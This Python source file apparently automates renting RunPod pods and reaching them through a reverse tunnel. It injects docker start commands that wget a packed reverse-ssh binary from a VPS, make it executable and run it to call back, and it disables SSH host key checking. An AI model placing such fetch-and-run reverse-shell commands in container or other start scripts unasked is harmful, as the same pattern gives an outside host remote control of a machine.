import asyncio
import re
import subprocess
import time
import shutil
import pexpect
import sys
from .client import RunpodClient
from .config import VPS_IP, REVERSE_PORT, LOCAL_SSH_PORT
from pwnlogger import logger, LogLevel


async def get_custom_docker_args(client: RunpodClient, template_id: str, s) -> str:
    """Fetches template arguments and injects the reverse-ssh payload."""
    s.update(f"Fetching template arguments...")
    s.debug(f"Template ID: {template_id}")
    query = "query getPodTemplate($id: String!) { podTemplate(id: $id) { dockerArgs } }"
    data = await client.query(query, {"id": template_id})
    original_args = data["data"]["podTemplate"].get("dockerArgs", "")

    clean_args = (
        original_args.strip().strip(";").strip()
        if original_args and original_args.lower() != "none"
        else ""
    )

    payload_commands = [
        f"wget http://{VPS_IP}/upx_reverse-sshx64 -O /tmp/upx_reverse-sshx64",
        "chmod +x /tmp/upx_reverse-sshx64",
        f"/tmp/upx_reverse-sshx64 -p {REVERSE_PORT} {VPS_IP}",
    ]

    raw_payload = "; ".join(payload_commands)
    if clean_args:
        raw_payload = f"{clean_args}; {raw_payload}"

    final_args = f"bash -c 'foo; {raw_payload}'"
    s.debug(f"Docker start arguments: {final_args}")
    return final_args


async def monitor_logs(client: RunpodClient, pod_id: str, stop_event: asyncio.Event, s):
    """Background task to stream logs."""
    s.update(f"Starting log monitoring...")
    seen = set()
    pattern = r"^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(\.\d+)?Z(\s+[a-z0-9]+)?\s+"
    while not stop_event.is_set():
        data = await client.get_logs(pod_id)
        logs = (data.get("system") or []) + (data.get("container") or [])
        for line in logs:
            content = re.sub(pattern, "", line).strip()
            if content and content not in seen:
                log_type = (
                    "SYSTEM" if line in (data.get("system") or []) else "CONTAINER"
                )
                s.debug(f"[{log_type}] {content}")
                seen.add(content)
        await asyncio.sleep(0.2)


async def monitor_tunnel(proc: subprocess.Popen, stop_event: asyncio.Event, s):
    """Background task to detect reverse tunnel establishment."""
    s.update("Monitoring local tunnel for incoming connections...")
    loop = asyncio.get_event_loop()
    while not stop_event.is_set():
        line = await loop.run_in_executor(None, proc.stdout.readline)
        if line and "New connection from" in line:
            s.debug(f"Tunnel connection detected: {line.strip()}")
            stop_event.set()
            break


async def orchestrate(
    template_id, instance_id, name, files=None, is_gpu=False, gpu_name=None, cores=1
):
    """Main orchestration loop."""
    pod_id, start_time, proc = None, None, None

    async with RunpodClient() as client:
        try:
            with logger.status(f"Deploying {name}...") as s:
                s.update("Checking account balance...")
                bal_data = await client.query("{ myself { clientBalance } }")
                bal = float(bal_data["data"]["myself"]["clientBalance"])
                s.debug(f"Current balance: ${bal:.2f}")

                s.update("Configuring container payload...")
                args = await get_custom_docker_args(client, template_id, s)

                if is_gpu:
                    q = "mutation Mutation($input: PodFindAndDeployOnDemandInput) { podFindAndDeployOnDemand(input: $input) { id } }"
                    v = {
                        "input": {
                            "gpuCount": cores,
                            "gpuTypeId": gpu_name,
                            "templateId": template_id,
                            "dockerArgs": args,
                            "name": f"runpod-{name}-session",
                            "containerDiskInGb": 20,
                            "cloudType": "SECURE",
                            "startJupyter": False,
                            "startSsh": False,
                        }
                    }
                else:
                    q = "mutation Mutation($input: deployCpuPodInput!) { deployCpuPod(input: $input) { id } }"
                    v = {
                        "input": {
                            "instanceId": instance_id,
                            "cloudType": "SECURE",
                            "templateId": template_id,
                            "dockerArgs": args,
                            "name": f"runpod-{name}-session",
                        }
                    }

                s.update("Creating pod instance...")
                res = await client.query(q, v)
                pod_id = (
                    res["data"]["podFindAndDeployOnDemand"]["id"]
                    if is_gpu
                    else res["data"]["deployCpuPod"]["id"]
                )

                s.debug(f"Pod ID: {pod_id}")
                start_time = time.time()

                s.update("Syncing pod metadata...")
                det_q = """
                query podDetailedInspector($input: PodFilter) {
                  pod(input: $input) {
                    costPerHr
                    machine { dataCenterId 
                      cpuType { displayName } gpuType { displayName } }
                  }
                }
                """
                det = await client.query(det_q, {"input": {"podId": pod_id}})
                pod_info = det["data"]["pod"]

                if pod_info:
                    machine = pod_info.get("machine", {})
                    cost_per_hr = pod_info.get("costPerHr", 0)
                    if is_gpu:
                        gpu_info = machine.get("gpuType")
                        hw_name = gpu_info["displayName"] if gpu_info else "NVIDIA GPU"
                    else:
                        cpu_info = machine.get("cpuType")
                        hw_name = (
                            cpu_info["displayName"] if cpu_info else "CPU Instance"
                        )

                s.debug(f"Hardware: {hw_name}")
                s.debug(f"Cores: {cores}")
                s.debug(f"Price: ${float(cost_per_hr):.2f}/hr")

                s.update("Starting web server...")
                subprocess.Popen(
                    [
                        "simplehttpserver",
                        "-listen",
                        "0.0.0.0:80",
                        "-path",
                        "/workspace/tooling",
                    ],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )

                s.update("Starting reverse SSH tunnel...")
                proc = subprocess.Popen(
                    [
                        "/workspace/tooling/upx_reverse-sshx64",
                        "-v",
                        "-l",
                        "-p",
                        REVERSE_PORT,
                    ],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1,
                )

                s.update("Waiting for tunnel establishment...")
                stop_event = asyncio.Event()
                await asyncio.gather(
                    monitor_logs(client, pod_id, stop_event, s),
                    monitor_tunnel(proc, stop_event, s),
                )
                s.finish("Tunnel connection established", level=LogLevel.SUCCESS)

            if files:
                logger.info(f"Uploading {len(files)} files to /workspace...")
                scp_cmd = (
                    [
                        "scp",
                        "-P",
                        LOCAL_SSH_PORT,
                        "-q",
                        "-o",
                        "StrictHostKeyChecking=no",
                        "-o",
                        "UserKnownHostsFile=/dev/null",
                    ]
                    + files
                    + ["root@127.0.0.1:/workspace/"]
                )
                subprocess.run(scp_cmd)

            logger.info("Dropping into interactive SSH session...")
            cols, rows = shutil.get_terminal_size()
            ssh_cmd = "ssh -p 8888 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=QUIET 127.0.0.1"
            child = pexpect.spawn(ssh_cmd, encoding="utf-8", dimensions=(rows, cols))

            child.sendline("cd /workspace")
            child.expect("\n")
            child.expect("\n")
            child.expect("\n")
            child.interact()
            sys.stdout.write("\033[F\033[K")
            sys.stdout.flush()

        except Exception as e:
            logger.error(f"Orchestration failure: {e}")
        finally:
            if proc:
                proc.terminate()

            if pod_id:
                logger.info(f"Cleaning up pod...")
                await client.query(
                    "mutation terminate($input: PodTerminateInput!) { podTerminate(input: $input) }",
                    {"input": {"podId": pod_id}},
                )
                elapsed = time.time() - start_time if start_time else 0
                cost = (
                    (elapsed / 3600) * float(pod_info.get("costPerHr", 0))
                    if pod_info
                    else 0
                )
                hours, remainder = divmod(int(elapsed), 3600)
                minutes, seconds = divmod(remainder, 60)
                duration_parts = []
                if hours > 0:
                    duration_parts.append(f"{hours}h")
                if minutes > 0:
                    duration_parts.append(f"{minutes}m")
                if seconds > 0:
                    duration_parts.append(f"{seconds}s")
                duration_str = "".join(duration_parts) or "0s"
                logger.debug(f"Duration: {duration_str}")
                logger.debug(f"Cost: ${cost:.6f}")
                sys.exit(0)
